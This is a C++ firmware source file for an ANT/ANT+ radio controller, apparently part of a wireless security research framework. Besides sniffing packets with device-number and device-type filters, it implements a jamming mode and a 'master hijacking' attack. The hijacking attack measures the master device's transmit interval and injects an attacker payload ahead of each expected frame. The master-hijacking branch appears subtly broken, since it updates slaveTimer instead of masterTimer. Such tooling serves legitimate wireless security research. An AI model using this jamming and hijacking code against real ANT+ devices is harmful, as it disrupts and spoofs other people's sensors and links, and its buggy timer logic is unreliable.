#include "antcontroller.h"
#include "../core.h"

ANTController::ANTController(Radio *radio) : Controller(radio) {
	this->timerModule = Core::instance->getTimerModule();
	this->masterTimer = NULL;
	this->slaveTimer = NULL;
}

void ANTController::start() {

  this->channel = 57;
  this->preamble = PREAMBLE_ANT_PLUS;
	this->sendingResponse = false;
  this->deviceNumber = 0;
  this->deviceType = 0;
  this->setHardwareConfiguration();
}

void ANTController::stop() {
	this->releaseTimers();
  this->radio->disable();
}


void ANTController::setFilter(uint16_t preamble, uint16_t deviceNumber, uint8_t deviceType) {
	uint16_t savedPreamble = this->preamble;
	this->preamble = preamble;
  this->deviceNumber = deviceNumber;
  this->deviceType = deviceType;
	if (savedPreamble != preamble) {
			this->setHardwareConfiguration();
	}
}


int ANTController::getChannel() {
    return this->channel;
}
bool ANTController::transmitCallback() {
  this->send(this->attackStatus.payload, this->attackStatus.size);
  return true;
}

void ANTController::setChannel(int channel) {
  this->channel = channel;
  this->radio->fastFrequencyChange(channel, channel);
}


void ANTController::startAttack(AntAttack attack) {
  this->attackStatus.attack = attack;
	if (attack == ANT_ATTACK_NONE) {
		this->releaseTimers();
		this->setHardwareConfiguration();
		this->attackStatus.running = false;
		this->attackStatus.successful = false;
	}
	else if (attack == ANT_ATTACK_JAMMING) {
		this->setJammerConfiguration();
		this->attackStatus.running = true;
		this->attackStatus.successful = false;
	}
	else if (attack == ANT_ATTACK_MASTER_HIJACKING) {
		this->setHardwareConfiguration();
		this->attackStatus.running = true;
		this->attackStatus.successful = false;
		this->attackStatus.currentTimestamp = 0;
		for (int i=0;i<TIMESTAMP_REPORTS_NB;i++) this->attackStatus.lastTimestamps[i] = 0;
	}

}

void ANTController::send(uint8_t *data, size_t size) {
  this->radio->send(data+2,size-2,this->channel, 0x00);
}

void ANTController::setAttackPayload(uint8_t *payload, size_t size) {
  for (size_t i=0;i<size;i++) {
    this->attackStatus.payload[i] = payload[i];
  }
  this->attackStatus.size = size;
}

void ANTController::sendResponsePacket(uint8_t *payload, size_t size) {
	this->setAttackPayload(payload,size);
	this->sendingResponse = true;
}

void ANTController::sendJammingReport(uint32_t timestamp) {
	//Core::instance->pushMessageToQueue(new JammingReportNotification(timestamp));
}

void ANTController::setJammerConfiguration() {
  uint8_t preamble[] = {(uint8_t)(this->preamble & 0xFF),(uint8_t)((this->preamble & 0xFF00) >> 8)};
  this->radio->setPreamble(preamble,2);
	this->radio->setPrefixes();
  this->radio->setMode(MODE_JAMMER);
  this->radio->setFastRampUpTime(true);
  this->radio->setEndianness(BIG);
  this->radio->setTxPower(POS8_DBM);
  this->radio->disableRssi();
  this->radio->setPhy(ESB_1MBITS);
  this->radio->setHeader(0,0,0);
  this->radio->setWhitening(NO_WHITENING);
  this->radio->setWhiteningDataIv(0);
	this->radio->disableJammingPatterns();
  this->radio->setCrc(NO_CRC);
  this->radio->setCrcSkipAddress(true);
  this->radio->setCrcSize(3);
  this->radio->setCrcInit(0x000000);
  this->radio->setCrcPoly(0x000000);
  this->radio->setPayloadLength(0);
  this->radio->setInterFrameSpacing(0);
  this->radio->setExpandPayloadLength(0);
  this->radio->setFrequency(this->channel);
  this->radio->reload();
}

void ANTController::setHardwareConfiguration() {
  uint8_t preamble[] = {(uint8_t)(this->preamble & 0xFF),(uint8_t)((this->preamble & 0xFF00) >> 8)};
  this->radio->setPreamble(preamble,2);
	this->radio->setPrefixes();
  this->radio->setMode(MODE_NORMAL);
  this->radio->setFastRampUpTime(true);
  this->radio->setEndianness(BIG);
  this->radio->setTxPower(POS8_DBM);
  this->radio->disableRssi();
  this->radio->setPhy(ESB_1MBITS);
  this->radio->setHeader(0,0,0);
  this->radio->setWhitening(NO_WHITENING);
  this->radio->setWhiteningDataIv(0);
	this->radio->disableJammingPatterns();
  this->radio->setCrc(HARDWARE_CRC);
  this->radio->setCrcSkipAddress(false);
  this->radio->setCrcSize(2);
  this->radio->setCrcInit(0xFFFF);
  this->radio->setCrcPoly(0x1021);
  this->radio->setPayloadLength(15-2);
  this->radio->setInterFrameSpacing(0);
  this->radio->setExpandPayloadLength(15-2);
  this->radio->setFrequency(this->channel);
	this->radio->reload();
}

uint32_t ANTController::calculateMasterInterval() {
	uint32_t interval = 0;
	for (int i=1;i<TIMESTAMP_REPORTS_NB;i++) {
		interval += this->attackStatus.lastTimestamps[i] - this->attackStatus.lastTimestamps[i-1];
	}
	return interval / (TIMESTAMP_REPORTS_NB - 1);
}

bool ANTController::checkFilter(ANTPacket* pkt) {
  bool matchingDeviceNumber = (this->deviceNumber == 0 || pkt->getDeviceNumber() == this->deviceNumber);
  bool matchingDeviceType = (this->deviceType == 0 || pkt->getDeviceType() == this->deviceType);
  return matchingDeviceNumber && matchingDeviceType;
}


void ANTController::releaseTimers() {
	if (this->masterTimer != NULL) {
		this->masterTimer->stop();
		this->masterTimer->release();
		this->masterTimer = NULL;
	}

	if (this->slaveTimer != NULL) {
		this->slaveTimer->stop();
		this->slaveTimer->release();
		this->slaveTimer = NULL;
	}
}

void ANTController::onReceive(uint32_t timestamp, uint8_t size, uint8_t *buffer, CrcValue crcValue, uint8_t rssi) {
  ANTPacket *pkt = new ANTPacket(buffer,size,timestamp,0x00,channel,rssi,crcValue, this->preamble);
  if (crcValue.validity == VALID_CRC && this->checkFilter(pkt)) {
    this->addPacket(pkt);
		if (this->sendingResponse) {
			if (this->slaveTimer == NULL) {
				this->slaveTimer = TimerModule::instance->getTimer();
			}
			this->slaveTimer->setMode(SINGLE_SHOT);
			this->slaveTimer->setCallback((ControllerCallback)&ANTController::transmitCallback, this);
			this->slaveTimer->update(2150, timestamp);
			this->slaveTimer->start();

			this->sendingResponse = false;
		}

		if (this->attackStatus.attack == ANT_ATTACK_MASTER_HIJACKING) {
			if (this->attackStatus.currentTimestamp < TIMESTAMP_REPORTS_NB) {
				this->attackStatus.lastTimestamps[this->attackStatus.currentTimestamp++] = timestamp;
			}
			else {
				uint32_t interval = this->calculateMasterInterval();
				if (this->masterTimer == NULL) {
					this->masterTimer = TimerModule::instance->getTimer();
				}
				this->masterTimer->setMode(REPEATED);
				this->masterTimer->setCallback((ControllerCallback)&ANTController::transmitCallback, this);
				this->slaveTimer->update(interval - 200, timestamp);
				this->masterTimer->start();

				this->attackStatus.successful = true;
			}
		}

  }
  else {
		delete pkt;
  }
}

void ANTController::onJam(uint32_t timestamp) {
  if (this->attackStatus.attack == ANT_ATTACK_JAMMING) {

    this->attackStatus.successful = true;
    this->sendJammingReport(timestamp);

  }
}

void ANTController::onEnergyDetection(uint32_t timestamp, uint8_t value) {}
